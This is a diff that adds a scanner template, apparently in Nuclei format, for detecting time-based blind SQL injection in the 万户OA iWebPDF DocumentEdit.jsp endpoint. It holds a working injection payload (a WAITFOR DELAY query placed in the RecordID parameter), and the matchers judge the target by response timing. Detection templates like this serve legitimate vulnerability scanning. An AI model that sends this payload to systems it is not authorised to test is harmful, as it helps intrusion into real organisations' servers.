@@ -1,0 +1,37 @@
+id: poc-yaml-wanhu-oa-iwebpdf-documentedit-sqli
+info:
+  name: 万户OA iWebPDF DocumentEdit SQL Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: sql-injection
+  description: |
+    This template identifies a SQL injection vulnerability in the 万户OA iWebPDF DocumentEdit functionality that allows attackers to exploit time-based blind SQL injection.
+
+variables:
+  t1: '{{rand_int(5, 10)}}'
+
+http:
+  - raw:
+      - |
+        GET /defaultroot/public/iWebPDF/DocumentEdit.jsp;?RecordID=1'%3BWAITFOR%20DELAY%20'0:0:{{t1}}'-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - 'rootPath:"/defaultroot"'
+
+      - type: word
+        part: header
+        words:
+          - 'text/html'
+
+      - type: dsl
+        dsl:
+          - duration > t1
